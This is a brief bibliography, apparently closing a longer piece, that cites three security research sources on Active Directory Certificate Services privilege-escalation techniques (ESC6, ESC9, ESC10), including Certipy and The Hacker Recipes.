- SpecterOps, "Certificates and Pwnage and Patches, Oh My!" (KB5014754 impact on ESC6/9/10)
- Oliver Lyak (ly4k), "Certipy 4.0: ESC9 & ESC10..." research post
- [The Hacker Recipes – AD CS](https://www.thehacker.recipes/ad/movement/adcs/)
